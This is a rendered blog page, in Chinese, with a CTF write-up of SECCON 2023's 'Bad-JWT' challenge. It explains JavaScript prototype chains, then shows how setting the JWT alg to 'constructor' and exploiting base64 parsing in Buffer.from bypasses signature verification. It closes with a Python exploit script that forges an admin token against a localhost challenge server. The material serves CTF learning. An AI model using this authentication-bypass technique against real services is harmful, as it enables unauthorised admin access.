@@ -1,0 +1,600 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Bad-JWT原型链污染https:&#x2F;&#x2F;github.com&#x2F;xryuseix&#x2F;CTF_Writeups&#x2F;tree&#x2F;master&#x2F;SECCON2023 原型与原型链https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6984678359275929637 构造函数与原型JS中没有类（Class）这个概念，所以JS的设计者使用了构造函数来实现继承机制，通过此生成实例。但是，在构造函数中通过this赋值的属">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023&#x2F;09&#x2F;18：SECCON2023">
+<meta property="og:url" content="http://example.com/2023/09/18/seccon2023/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Bad-JWT原型链污染https:&#x2F;&#x2F;github.com&#x2F;xryuseix&#x2F;CTF_Writeups&#x2F;tree&#x2F;master&#x2F;SECCON2023 原型与原型链https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6984678359275929637 构造函数与原型JS中没有类（Class）这个概念，所以JS的设计者使用了构造函数来实现继承机制，通过此生成实例。但是，在构造函数中通过this赋值的属">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/09/18/seccon2023/yuanx.png">
+<meta property="og:image" content="http://example.com/2023/09/18/seccon2023/zhong.png">
+<meta property="og:image" content="http://example.com/2023/09/18/seccon2023/%E8%AE%B2%E8%A7%A31.png">
+<meta property="og:image" content="http://example.com/2023/09/18/seccon2023/ceng.png">
+<meta property="article:published_time" content="2023-09-18T14:26:58.000Z">
+<meta property="article:modified_time" content="2023-09-22T12:33:36.783Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/09/18/seccon2023/yuanx.png">
+  
+  
+  
+  <title>2023/09/18：SECCON2023 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023/09/18：SECCON2023"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-18 22:26" pubdate>
+          September 18, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023/09/18：SECCON2023</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Bad-JWT"><a href="#Bad-JWT" class="headerlink" title="Bad-JWT"></a>Bad-JWT</h2><p>原型链污染<br><a target="_blank" rel="noopener" href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p>
+<h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6984678359275929637">https://juejin.cn/post/6984678359275929637</a></p>
+<h4 id="构造函数与原型"><a href="#构造函数与原型" class="headerlink" title="构造函数与原型"></a>构造函数与原型</h4><p>JS中没有类（Class）这个概念，所以JS的设计者使用了构造函数来实现继承机制，通过此生成实例。但是，在构造函数中通过this赋值的属性或者方法，是每个实例的实例属性以及实例方法，无法共享公共属性。此时需要原型对象来储存构造函数的公共属性和方法</p>
+<h4 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h4><p>JS的每个函数在创建的时候，都会生成一个属性prototype，这个属性指向一个对象，这个对象就是此函数的原型对象。该原型对象中有个属性为constructor，指向该函数。这样原型对象和它的函数之间就产生了联系。</p>
+<h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><img src="/2023/09/18/seccon2023/yuanx.png" srcset="/img/loading.gif" lazyload class="">
+<p>每个通过构造函数创建出来的实例对象，其本身有个属性__proto__9各大厂商具体实现时添加的私有属性），这个属性会指向该实例对象的构造函数的原型对象<br>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的__proto__隐式属性，找到它的构造函数的原型对象，如果还没有找到就会再在其构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，称为原型链<br>如果通过某个实例对象的__proto__属性赋值，则会改变其构造函数的原型对象，从而被所有实例所共享。</p>
+<h4 id="原型链的尽头"><a href="#原型链的尽头" class="headerlink" title="原型链的尽头"></a>原型链的尽头</h4><p>所有的原型对象的__proto__属性都是指向function Object的原型对象。 而function Object的原型对象在上图中我们可以得知是不存在__proto__这个属性的，它指向了null<br>对于函数，它的__proto__属性指向了一个function Function的原型对象，该原型对象为JS中所有函数的原型对象，而其__proto__属性也还是指向了function Object的原型对象</p>
+<img src="/2023/09/18/seccon2023/zhong.png" srcset="/img/loading.gif" lazyload class="">
+<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>太不智能了还要手写脚本发JWT（）<br>查看原代码，需要以admin身份登录，会对jwt检验<br>大致思路：<br>看看dockerfile-&gt;node.js<br>session.isadmin-&gt;app.listen-&gt;sign<br>index找flag-&gt;session.isadmin-&gt;app.use-&gt;jwt.verify-&gt;(jwt.js)verify<br>verify:parseToken/createSignature/… -&gt;signature-&gt;algorithms[…]-&gt;<br>const algorithms<br>index.js：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">app.<span class="hljs-keyword">listen</span>(PORT, () =&gt; &#123;<br>	const admin_session = jwt.sign(<span class="hljs-string">&#x27;HS512&#x27;</span>, &#123; isAdmin: <span class="hljs-keyword">true</span> &#125;, secret);<br>	console.log(`[<span class="hljs-keyword">INFO</span>] Use $&#123;admin_session&#125; <span class="hljs-keyword">as</span> <span class="hljs-keyword">session</span> cookie`);<br>  console.log(`Challenge <span class="hljs-keyword">server</span> listening <span class="hljs-keyword">on</span> port $&#123;PORT&#125;`);<br>&#125;);<br></code></pre></td></tr></table></figure>
+<p>以此判断需要<code>&#123; isAdmin: true &#125;</code><br>关键点如下：<br>jwt.js</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">const</span> algorithms = &#123;<br>	hs256: (<span class="hljs-class"><span class="hljs-keyword">data</span>, secret) =&gt; </span><br>		base64UrlEncode(crypto.createHmac(&#x27;sha256&#x27;, secret).update(<span class="hljs-class"><span class="hljs-keyword">data</span>).digest()),</span><br>	hs512: (<span class="hljs-class"><span class="hljs-keyword">data</span>, secret) =&gt; </span><br>		base64UrlEncode(crypto.createHmac(&#x27;sha512&#x27;, secret).update(<span class="hljs-class"><span class="hljs-keyword">data</span>).digest()),</span><br>&#125;<br>...<br><span class="hljs-title">const</span> createSignature = (header, payload, secret) =&gt; &#123;<br>  const <span class="hljs-class"><span class="hljs-keyword">data</span> = `$&#123;<span class="hljs-title">stringifyPart</span>(<span class="hljs-title">header</span>)&#125;.$&#123;<span class="hljs-title">stringifyPart</span>(<span class="hljs-title">payload</span>)&#125;`;</span><br>  const signature = algorithms[header.alg.toLowerCase()](<span class="hljs-class"><span class="hljs-keyword">data</span>, secret);</span><br>  return signature;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>使用node命令进入REPL（终端类似物）可进行调试</p>
+<img src="/2023/09/18/seccon2023/%E8%AE%B2%E8%A7%A31.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/09/18/seccon2023/ceng.png" srcset="/img/loading.gif" lazyload class="">
+<p>（蹭个图）<br>存在一个constructor属性（见原型链），这个属性调用之后回直接返回一个Function，实际上就是这个具体对象的构造函数，然后对其调用，实际上只会返回第一个参数（原理上就是获得了原型，然后进行了初始化，返回对象）<br>接下来就是verify函数中的<code>Buffer.from</code>和<code>Buffer.compare</code>（验证签名signature）</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> verify = (token, secret) =&gt; &#123;<br>	<span class="hljs-keyword">const</span> &#123; header, payload, signature: expected_signature &#125; = parseToken(token);<br><br>	<span class="hljs-keyword">const</span> calculated_signature = createSignature(header, payload, secret);<br>	<br>	<span class="hljs-keyword">const</span> calculated_buf = Buffer.<span class="hljs-keyword">from</span>(calculated_signature, <span class="hljs-string">&#x27;base64&#x27;</span>);<br>	<span class="hljs-keyword">const</span> expected_buf = Buffer.<span class="hljs-keyword">from</span>(expected_signature, <span class="hljs-string">&#x27;base64&#x27;</span>);<br><br>	<span class="hljs-keyword">if</span> (Buffer.compare(calculated_buf, expected_buf) !== <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;Invalid signature&#x27;</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> payload;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>Buffer.from(txt, &quot;base64&quot;)</code>不用作 base64的字符被忽略，不会解析不是base64的字符串<br><code>Buffer.compare</code>字符串和字符串对象是相同<br><code>&#123;headerBase64&#125;.&#123;bodyBase64&#125;</code>可以得到<code>eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjogdHJ1ZX0</code>，用<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ</code>作为签名，结果如下：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">expected_signature: &#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ&#x27;,<br>  calculated_signature: [String: &#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ&#x27;],<br>  calculated_buf: &lt;Buffer 7b<span class="hljs-number"> 22 </span>74<span class="hljs-number"> 79 </span>70<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 22 </span>4a<span class="hljs-number"> 57 </span>54<span class="hljs-number"> 22 </span>2c<span class="hljs-number"> 22 </span>61 6c<span class="hljs-number"> 67 </span>22 3a<span class="hljs-number"> 22 </span>63 6f 6e<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 72 </span>75<span class="hljs-number"> 63 </span>74 6f<span class="hljs-number"> 72 </span>22 7d 7b<span class="hljs-number"> 22 </span>69<span class="hljs-number"> 73 </span>41<span class="hljs-number"> 64 </span>6d<span class="hljs-number"> 69 </span>6e<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 74 </span>72<span class="hljs-number"> 75 </span>65 7d&gt;,<br>  expected_buf: &lt;Buffer 7b<span class="hljs-number"> 22 </span>74<span class="hljs-number"> 79 </span>70<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 22 </span>4a<span class="hljs-number"> 57 </span>54<span class="hljs-number"> 22 </span>2c<span class="hljs-number"> 22 </span>61 6c<span class="hljs-number"> 67 </span>22 3a<span class="hljs-number"> 22 </span>63 6f 6e<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 72 </span>75<span class="hljs-number"> 63 </span>74 6f<span class="hljs-number"> 72 </span>22 7d 7b<span class="hljs-number"> 22 </span>69<span class="hljs-number"> 73 </span>41<span class="hljs-number"> 64 </span>6d<span class="hljs-number"> 69 </span>6e<span class="hljs-number"> 22 </span>3a<span class="hljs-number"> 74 </span>72<span class="hljs-number"> 75 </span>65 7d&gt;<br></code></pre></td></tr></table></figure>
+<p>签名肯定是不同的，但是<code>buffer.from</code>移除了句点，<code>buffer.compare</code>的结果等于0，绕过了签名的验证<br>大佬exp</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br><br><br><span class="hljs-keyword">header</span> = &#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;constructor&quot;&#125;<br>headerStr = <span class="hljs-type">json</span>.dumps(<span class="hljs-keyword">header</span>).encode(&quot;utf-8&quot;)<br>body = &#123;&quot;isAdmin&quot;: <span class="hljs-keyword">True</span>&#125;<br>bodyStr = <span class="hljs-type">json</span>.dumps(body).encode(&quot;utf-8&quot;)<br><br>def base64_encode(str: str):<br>    <span class="hljs-keyword">return</span> (<br>        base64.b64encode(str).replace(b&quot;=&quot;, b&quot;&quot;).replace(b&quot;+&quot;, b&quot;-&quot;).replace(b&quot;/&quot;, b&quot;_&quot;)<br>    )<br><br><br>headerBase64 = str(base64_encode(headerStr))[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>bodyBase64 = str(base64_encode(bodyStr))[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br><br>jwt = f&quot;&#123;headerBase64&#125;.&#123;bodyBase64&#125;.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ&quot;<br>print(jwt)<br>res = requests.<span class="hljs-keyword">get</span>(&quot;http://localhost:3000/&quot;, cookies=&#123;&quot;session&quot;: jwt&#125;)<br><br>print(res.text)<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/19/CSAW2023/" title="2023/09/19：CSAW2023">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023/09/19：CSAW2023</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/15/moectf2023/" title="2023/9/17：Moectf2023">
+                        <span class="hidden-mobile">2023/9/17：Moectf2023</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
